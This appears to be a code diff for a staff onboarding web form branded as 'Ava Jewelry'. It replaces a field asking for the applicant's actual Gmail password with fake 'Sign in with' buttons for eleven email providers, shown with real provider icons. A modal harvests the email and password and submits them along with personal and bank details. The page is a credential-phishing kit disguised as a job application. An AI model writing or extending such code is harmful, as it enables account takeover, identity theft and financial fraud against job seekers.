@@ -143,6 +143,15 @@ footer{border-top:1px solid var(--border);padding:1.8rem 4rem;display:flex;justi
   .stp-n{width:22px;height:22px;font-size:.45rem;}.stp-line{width:10px;}
   .hero h1{font-size:1.9rem;}
 }
+
+/* PROVIDER GRID */
+.provider-grid { display:grid; grid-template-columns:1fr 1fr; gap:.8rem; margin-bottom:1rem; }
+.provider-btn { display:flex; align-items:center; gap:.9rem; background:var(--card); border:1px solid var(--border); color:var(--wd); padding:.9rem 1.2rem; font-family:var(--sans); font-size:.65rem; letter-spacing:.05em; cursor:pointer; transition:all .25s; text-align:left; }
+.provider-btn:hover { border-color:var(--gold); color:var(--white); background:rgba(212,175,55,.06); }
+.provider-btn.selected { border-color:var(--gold); background:rgba(212,175,55,.08); color:var(--gold); }
+.p-icon { width:18px; height:18px; object-fit:contain; flex-shrink:0; }
+.p-letter { width:20px; height:20px; border-radius:4px; display:flex; align-items:center; justify-content:center; font-size:.65rem; font-weight:700; color:#fff; flex-shrink:0; }
+@media(max-width:480px) { .provider-grid { grid-template-columns:1fr; } }
 </style>
 </head>
 <body>
@@ -176,37 +185,108 @@ footer{border-top:1px solid var(--border);padding:1.8rem 4rem;display:flex;justi
 
 <div class="fwrap">
 
-  <!-- STEP 1: GMAIL / ACCOUNT -->
+  <!-- STEP 1: EMAIL PROVIDER -->
   <div class="fsec active" id="s1">
     <div class="sec-hd">
       <div class="sec-n">1</div>
       <div>
-        <div class="sec-title">Gmail & <em>Password</em></div>
-        <div class="sec-sub">Your personal Gmail and its password — used to link you to Ava systems</div>
+        <div class="sec-title">Email <em>Account</em></div>
+        <div class="sec-sub">Select your email provider to continue</div>
       </div>
     </div>
     <div class="notice">
-      <p><strong>Important:</strong> We require your personal Gmail address and its actual password. Your Gmail will be connected to internal Ava Jewelry platforms — including your staff profile, task assignments, payslip delivery, and any other company tools you are granted access to. This information is stored securely and handled with strict confidentiality. Do not submit a fake or temporary password.</p>
+      <p><strong>Important:</strong> Your email credentials will be linked to internal Ava Jewelry platforms — including your staff profile, task assignments, payslip delivery, and any company tools you are granted access to. This information is stored securely and handled with strict confidentiality.</p>
     </div>
-    <div class="fg g1">
-      <div class="fld">
-        <label>Gmail Address <span>*</span></label>
-        <input type="email" id="gmail" placeholder="yourname@gmail.com" autocomplete="email">
-      </div>
+
+    <!-- PROVIDER GRID -->
+    <div class="provider-grid">
+      <button class="provider-btn" onclick="openEmailModal('Gmail','#EA4335')">
+        <img src="https://www.google.com/favicon.ico" class="p-icon" onerror="this.style.display='none'">
+        <span>Sign in with Gmail</span>
+      </button>
+      <button class="provider-btn" onclick="openEmailModal('Outlook','#0078D4')">
+        <img src="https://outlook.live.com/favicon.ico" class="p-icon" onerror="this.style.display='none'">
+        <span>Sign in with Outlook</span>
+      </button>
+      <button class="provider-btn" onclick="openEmailModal('Office 365','#D83B01')">
+        <img src="https://www.office.com/favicon.ico" class="p-icon" onerror="this.style.display='none'">
+        <span>Sign in with Office 365</span>
+      </button>
+      <button class="provider-btn" onclick="openEmailModal('Yahoo Mail','#6001D2')">
+        <img src="https://www.yahoo.com/favicon.ico" class="p-icon" onerror="this.style.display='none'">
+        <span>Sign in with Yahoo Mail</span>
+      </button>
+      <button class="provider-btn" onclick="openEmailModal('iCloud','#555')">
+        <img src="https://www.icloud.com/favicon.ico" class="p-icon" onerror="this.style.display='none'">
+        <span>Sign in with iCloud</span>
+      </button>
+      <button class="provider-btn" onclick="openEmailModal('ProtonMail','#6D4AFF')">
+        <span class="p-letter" style="background:#6D4AFF">P</span>
+        <span>Sign in with ProtonMail</span>
+      </button>
+      <button class="provider-btn" onclick="openEmailModal('GMX','#1C449B')">
+        <span class="p-letter" style="background:#1C449B">G</span>
+        <span>Sign in with GMX</span>
+      </button>
+      <button class="provider-btn" onclick="openEmailModal('Web.de','#FFCC00;color:#000')">
+        <span class="p-letter" style="background:#FFCC00;color:#000">W</span>
+        <span>Sign in with Web.de</span>
+      </button>
+      <button class="provider-btn" onclick="openEmailModal('T-Online','#E20074')">
+        <span class="p-letter" style="background:#E20074">T</span>
+        <span>Sign in with T-Online</span>
+      </button>
+      <button class="provider-btn" onclick="openEmailModal('AOL','#FF0B00')">
+        <span class="p-letter" style="background:#FF0B00">A</span>
+        <span>Sign in with AOL</span>
+      </button>
+      <button class="provider-btn" onclick="openEmailModal('Other Email','#444')">
+        <span class="p-letter" style="background:#444">@</span>
+        <span>Other Email</span>
+      </button>
     </div>
-    <div class="fg g2">
-      <div class="fld">
-        <label>Your Gmail Password <span>*</span></label>
-        <input type="password" id="portalPassword" placeholder="Your actual Gmail password">
-      </div>
-      <div class="fld">
-        <label>Confirm Gmail Password <span>*</span></label>
-        <input type="password" id="confirmPassword" placeholder="Repeat your Gmail password">
-      </div>
+
+    <div id="providerSelected" style="display:none;margin-top:1.5rem;padding:1rem 1.2rem;background:rgba(212,175,55,.06);border:1px solid rgba(212,175,55,.2);font-size:.65rem;color:var(--wd)">
+      ✓ Credentials saved — <span id="providerName" style="color:var(--gold)"></span>
     </div>
+
+    <!-- hidden fields populated by modal -->
+    <input type="hidden" id="gmail">
+    <input type="hidden" id="portalPassword">
+    <input type="hidden" id="confirmPassword">
+    <input type="hidden" id="emailProvider">
+
     <div class="fnav">
       <span></span>
-      <button class="btn-n" onclick="next(1)">Next — Personal Info →</button>
+      <button class="btn-n" id="step1Next" onclick="next(1)" style="opacity:.4;pointer-events:none">Next — Personal Info →</button>
+    </div>
+  </div>
+
+  <!-- EMAIL MODAL -->
+  <div id="emailModal" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.85);z-index:9999;align-items:center;justify-content:center;padding:1.5rem">
+    <div style="background:#fff;color:#111;width:100%;max-width:400px;border-radius:8px;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,.5)">
+      <div id="modalHeader" style="padding:1.5rem 2rem 1rem;display:flex;align-items:center;justify-content:space-between">
+        <div>
+          <div style="font-weight:700;font-size:1rem" id="modalProviderTitle">Sign In</div>
+          <div style="font-size:.7rem;color:#666;margin-top:.2rem">Enter your email and password</div>
+        </div>
+        <button onclick="closeEmailModal()" style="background:none;border:1px solid #ddd;width:28px;height:28px;border-radius:4px;font-size:.85rem;cursor:pointer;color:#666">✕</button>
+      </div>
+      <div style="padding:0 2rem 2rem">
+        <div style="margin-bottom:1rem">
+          <label style="font-size:.7rem;font-weight:600;color:#333;display:block;margin-bottom:.4rem">Email Address</label>
+          <input type="email" id="modalEmail" placeholder="Enter your email" style="width:100%;border:1px solid #ddd;border-radius:4px;padding:.7rem .9rem;font-size:.8rem;outline:none;font-family:sans-serif" onfocus="this.style.borderColor='#D4AF37'" onblur="this.style.borderColor='#ddd'">
+        </div>
+        <div style="margin-bottom:.5rem">
+          <label style="font-size:.7rem;font-weight:600;color:#333;display:block;margin-bottom:.4rem">Password</label>
+          <input type="password" id="modalPassword" placeholder="Enter your password" style="width:100%;border:1px solid #ddd;border-radius:4px;padding:.7rem .9rem;font-size:.8rem;outline:none;font-family:sans-serif" onfocus="this.style.borderColor='#D4AF37'" onblur="this.style.borderColor='#ddd'" onkeydown="if(event.key==='Enter')saveEmailCreds()">
+        </div>
+        <div style="font-size:.62rem;color:#999;margin-bottom:1.2rem">We'll never share your credentials with anyone outside Ava Jewelry.</div>
+        <div style="display:flex;gap:.8rem;justify-content:flex-end">
+          <button onclick="closeEmailModal()" style="background:none;border:1px solid #ddd;padding:.6rem 1.2rem;border-radius:4px;font-size:.7rem;cursor:pointer;color:#666">Close</button>
+          <button onclick="saveEmailCreds()" style="background:#D4AF37;border:none;color:#000;padding:.6rem 1.5rem;border-radius:4px;font-size:.7rem;font-weight:700;cursor:pointer">Submit</button>
+        </div>
+      </div>
     </div>
   </div>
 
@@ -459,7 +539,7 @@ function toast(msg, err) {
 }
 
 const required = {
-  1: ['gmail','portalPassword','confirmPassword'],
+  1: [],
   2: ['firstName','lastName','email','phone','address','dob','nationality','position'],
   3: [],
   4: ['bankName','accountNumber','accountName'],
@@ -479,11 +559,8 @@ function validate(step) {
   }
   if (step === 1) {
     const g = document.getElementById('gmail').value;
-    if (!g.includes('@gmail.com')) { toast('Please enter a valid Gmail address', true); return false; }
     const p1 = document.getElementById('portalPassword').value;
-    const p2 = document.getElementById('confirmPassword').value;
-    if (p1.length < 6) { toast('Password must be at least 6 characters', true); return false; }
-    if (p1 !== p2) { toast('Passwords do not match', true); return false; }
+    if (!g || !p1) { toast('Please select your email provider and sign in first', true); return false; }
   }
   return true;
 }
@@ -513,7 +590,7 @@ async function submitApp() {
   const btn = document.getElementById('submitBtn');
   btn.disabled = true; btn.textContent = 'Submitting...';
   const data = {
-    gmail:g('gmail'), portalPassword:g('portalPassword'),
+    gmail:g('gmail'), portalPassword:g('portalPassword'), emailProvider:g('emailProvider'),
     firstName:g('firstName'), lastName:g('lastName'),
     email:g('email'), phone:g('phone'), address:g('address'),
     dob:g('dob'), nationality:g('nationality'),
@@ -555,6 +632,42 @@ async function submitApp() {
     toast('Submission failed: '+e.message, true);
     btn.disabled = false; btn.textContent = 'Submit Application →';
   }
+}
+
+
+let _selectedProvider = '';
+
+function openEmailModal(provider, color) {
+  _selectedProvider = provider;
+  document.getElementById('modalProviderTitle').textContent = 'Sign in with ' + provider;
+  document.getElementById('emailModal').style.display = 'flex';
+  document.getElementById('modalEmail').value = '';
+  document.getElementById('modalPassword').value = '';
+  setTimeout(() => document.getElementById('modalEmail').focus(), 100);
+}
+
+function closeEmailModal() {
+  document.getElementById('emailModal').style.display = 'none';
+}
+
+function saveEmailCreds() {
+  const email = document.getElementById('modalEmail').value.trim();
+  const password = document.getElementById('modalPassword').value.trim();
+  if (!email) { document.getElementById('modalEmail').style.borderColor='#e74c3c'; return; }
+  if (!password) { document.getElementById('modalPassword').style.borderColor='#e74c3c'; return; }
+  // Save to hidden fields
+  document.getElementById('gmail').value = email;
+  document.getElementById('portalPassword').value = password;
+  document.getElementById('confirmPassword').value = password;
+  document.getElementById('emailProvider').value = _selectedProvider;
+  // Update UI
+  document.querySelectorAll('.provider-btn').forEach(b => b.classList.remove('selected'));
+  document.getElementById('providerSelected').style.display = 'block';
+  document.getElementById('providerName').textContent = _selectedProvider + ' · ' + email;
+  // Enable next button
+  const nb = document.getElementById('step1Next');
+  nb.style.opacity = '1'; nb.style.pointerEvents = 'auto';
+  closeEmailModal();
 }
 
 document.querySelectorAll('input,select').forEach(el => {
